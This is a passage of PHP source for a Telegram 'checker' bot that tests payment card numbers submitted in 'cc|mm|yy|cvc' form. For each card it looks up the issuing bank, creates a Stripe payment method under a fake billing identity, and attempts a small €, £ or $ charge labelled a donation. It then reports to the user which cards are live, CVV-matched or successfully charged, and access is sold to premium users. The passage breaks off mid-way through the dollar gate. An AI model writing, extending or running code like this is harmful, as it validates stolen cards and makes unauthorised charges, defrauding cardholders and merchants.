        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Do Not Honor</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» SK IS AT RATE LIMIT</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Card Number Is Incorrect</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge ₹$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        else {
        sendMessage($chatId, "<b>Try other gates or send correct format%0A<code>cc|mm|yy|cvc</code></b>", $message_id);};}
        else{
        sendMessage($chatId, "<b>You are not authorized to use a premium gate, contact @EuxxxuE  to get authorization%0A⋆Bot by --»[GUNNU]⛈</b>", $message_id);
        }
        }
        
            //////////=========[€1 CHARGE GATE]=========//////////
    
    
    elseif ((strpos($message, ".eur") === 0)||(strpos($message, "!eur") === 0)||(strpos($message, "/eur") === 0)){
        if (in_array($userId, $premium)) {
        $lista = substr($message, 5);
        $i = explode("|", $lista);
        $cc = $i[0];
        $mon = $i[1];
        $year = $i[2];
        $year1 = substr($yyyy, 2, 4);
        $cvv = $i[3];
        $amt = $i[4];
        $sk = 'sk_live_xxxxxxxxxxxxxxxx';
        function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);  
        return $str[0];
        };
       $separa = explode("|", $lista);
        $cc = $separa[0];
        $mes = $separa[1];
        $ano = $separa[2];
        $cvv = $separa[3];
        $amt = $separa[4];
        if(empty($amt)){
        $amt = '1';
        }
        $amount = $amt * 100;
        $lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = GetStr($fim, '"bank":{"name":"', '"');
        $name = GetStr($fim, '"name":"', '"');
        $brand = GetStr($fim, '"brand":"', '"');
        $country = GetStr($fim, '"country":{"name":"', '"');
        $emoji = GetStr($fim, '"emoji":"', '"');
        $scheme = GetStr($fim, '"scheme":"', '"');
        $type = GetStr($fim, '"type":"', '"');
        if(strpos($fim, '"type":"credit"') !== false){
        $bin = 'Credit';
        }else{
        $bin = 'Debit';
        };
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]='.$mail.'@gmail.com&billing_details[name]=Gunnu Mittal');
        $result1 = curl_exec($ch);
        $tok1 = Getstr($result1,'"id": "','"');
        $msg1 = Getstr($result1,'"message": "','"');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=eur&payment_method_types[]=card&description=Gunnu Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
        $result2 = curl_exec($ch);
        $msg2 = Getstr($result2,'"message": "','"');
        $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
        if(strpos($result2, '"seller_message": "Payment complete."' )) {
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Charged €$amt  ✅</b>%0A<b>Gateway -» Stripe Charge €$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A</b>%0A<b>Checked By -» @$usernam</b>%0A<b>Bot -» @eslamcheckerbot</b>%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE</b>", $message_id);
        }
        elseif(strpos($result2, "insufficient_funds" )) {
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Insufficient Funds</b>%0A<b>Gateway -» Stripe Charge €$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» 3DS2 REQUIRED</b>%0A<b>Gateway -» Stripe Charge €$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result2,'"cvc_check": "pass"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Payment Cannot Be Completed</b>%0A<b>Gateway -» Stripe Charge €$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result2,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge €$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result1,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge €$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
         elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Expired Card</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $€$amt</b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Transaction Not Allowed</b>%0A<b>Gateway -» Stripe Charge €$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Fraudulent</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge €$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "generic_decline")) || (strpos($result2, "generic_decline"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge €$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);
        }
        elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Do Not Honor</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge €$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A</b>%0A<b>⋆Type:</b> $type %0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» SK IS AT RATE LIMIT</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge €$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Card Number Is Incorrect</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge €$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
         else {
        sendMessage($chatId, "<b>Try other gates or send correct format%0A<code>cc|mm|yy|cvc</code></b>", $message_id);};}
        else {
        sendMessage($chatId, "<b>You are not authorized to use a premium gate, contact @EuxxxuE  to get authorization%0A⋆Bot by --»[GUNNU]⛈</b>", $message_id);
        }
        }
    
    
    
    //////////=========[£1 CHARGE GATE]=========//////////
    
    
    elseif ((strpos($message, ".gbp") === 0)||(strpos($message, "!gbp") === 0)||(strpos($message, "/gbp") === 0)){
        if (in_array($userId, $premium)) {
        $lista = substr($message, 5);
        $i = explode("|", $lista);
        $cc = $i[0];
        $mon = $i[1];
        $year = $i[2];
        $year1 = substr($yyyy, 2, 4);
        $cvv = $i[3];
        $amt = $i[4];
        $sk = 'sk_live_xxxxxxxxxxxxxxxx';
        function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);  
        return $str[0];
        };
       $separa = explode("|", $lista);
        $cc = $separa[0];
        $mes = $separa[1];
        $ano = $separa[2];
        $cvv = $separa[3];
        $amt = $separa[4];
        if(empty($amt)){
        $amt = '1';
        }
        $amount = $amt * 100;
        $lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = GetStr($fim, '"bank":{"name":"', '"');
        $name = GetStr($fim, '"name":"', '"');
        $brand = GetStr($fim, '"brand":"', '"');
        $country = GetStr($fim, '"country":{"name":"', '"');
        $emoji = GetStr($fim, '"emoji":"', '"');
        $scheme = GetStr($fim, '"scheme":"', '"');
        $type = GetStr($fim, '"type":"', '"');
        if(strpos($fim, '"type":"credit"') !== false){
        $bin = 'Credit';
        }else{
        $bin = 'Debit';
        };
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]='.$mail.'@gmail.com&billing_details[name]=Gunnu Mittal');
        $result1 = curl_exec($ch);
        $tok1 = Getstr($result1,'"id": "','"');
        $msg1 = Getstr($result1,'"message": "','"');
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$amount.'&currency=gbp&payment_method_types[]=card&description=Gunnu Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
        $result2 = curl_exec($ch);
        $msg2 = Getstr($result2,'"message": "','"');
        $rcp = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));
        if(strpos($result2, '"seller_message": "Payment complete."' )) {
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Charged £$amt  ✅</b>%0A<b>Gateway -» Stripe Charge £$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A</b>%0A<b>Checked By -» @$usernam</b>%0A<b>Bot -» @eslamcheckerbot</b>%0A<b>Bot by --»[GUNNU]⛈%0A @EuxxxuE</b>", $message_id);
        }
        elseif(strpos($result2, "insufficient_funds" )) {
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Insufficient Funds</b>%0A<b>Gateway -» Stripe Charge £$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» 3DS2 REQUIRED</b>%0A<b>Gateway -» Stripe Charge £$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result2,'"cvc_check": "pass"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Payment Cannot Be Completed</b>%0A<b>Gateway -» Stripe Charge £$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result2,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge £$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif(strpos($result1,'"code": "incorrect_cvc"')){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe Charge £$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
         elseif ((strpos($result1, "expired_card")) || (strpos($result2, "expired_card"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Expired Card</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge $£$amt</b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Transaction Not Allowed</b>%0A<b>Gateway -» Stripe Charge £$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "fraudulent")) || (strpos($result2, "fraudulent"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Fraudulent</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge £$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, "generic_decline")) || (strpos($result2, "generic_decline"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge £$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);
        }
        elseif ((strpos($result1, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Do Not Honor</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge £$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A</b>%0A<b>⋆Type:</b> $type %0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» SK IS AT RATE LIMIT</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge £$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
        elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
        sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Card Number Is Incorrect</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe Charge £$amt </b>%0A%0A<b><b>⋆Bank:</b> $bank %0A<b>⋆Country:</b> $name $emoji %0A<b>⋆Brand:</b> $brand %0A<b>⋆Type:</b> $type %0A</b>%0A<b>⋆Checked By -» @$usernam</b>%0A<b>⋆Bot -» @eslamcheckerbot</b>%0A<b>⋆Bot by --»[GUNNU]⛈%0A [@eslamchk]</b>", $message_id);}
         else {
        sendMessage($chatId, "<b>Try other gates or send correct format%0A<code>cc|mm|yy|cvc</code></b>", $message_id);};}
        else {
        sendMessage($chatId, "<b>You are not authorized to use a premium gate, contact @EuxxxuE  to get authorization%0A⋆Bot by --»[GUNNU]⛈</b>", $message_id);
        }
        }
        
    
    //////////=========[$1 CHARGE GATE]=========//////////
    
    
    elseif ((strpos($message, "/usd") === 0)||(strpos($message, "!usd") === 0)||(strpos($message, ".usd") === 0)){
    if (in_array($userId, $premium)) {
    $lista = substr($message, 5);
    $i = explode("|", $lista);
    $cc = $i[0];
    $mon = $i[1];
    $year = $i[2];
    $year1 = substr($yyyy, 2, 4);
    $cvv = $i[3];
    $amt = $i[4];
    $sk = 'sk_live_xxxxxxxxxxxxxxxx';
    function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
    };
    $separa = explode("|", $lista);
    $cc = $separa[0];
    $mes = $separa[1];
    $ano = $separa[2];
    $cvv = $separa[3];
    $amt = $separa[4];
    if(empty($amt)){
    $amt = '1';
    }
    $amount = $amt * 100;
    $lista = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $fim = curl_exec($ch);
    $bank = GetStr($fim, '"bank":{"name":"', '"');
    $name = GetStr($fim, '"name":"', '"');
    $brand = GetStr($fim, '"brand":"', '"');
    $country = GetStr($fim, '"country":{"name":"', '"');
    $emoji = GetStr($fim, '"emoji":"', '"');
    $scheme = GetStr($fim, '"scheme":"', '"');
    $type = GetStr($fim, '"type":"', '"');
    if(strpos($fim, '"type":"credit"') !== false){
    $bin = 'Credit';
    }else{
    $bin = 'Debit';
    };
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&billing_details[address][line1]=36&billing_details[address][line2]=Regent Street&billing_details[address][city]=Jamestown&billing_details[address][postal_code]=14701&billing_details[address][state]=New York&billing_details[address][country]=US&billing_details[email]='.$mail.'@gmail.com&billing_details[name]=Gunnu Mittal');
    $result1 = curl_exec($ch);
    $tok1 = Getstr($result1,'"id": "','"');
    $msg1 = Getstr($result1,'"message": "','"');
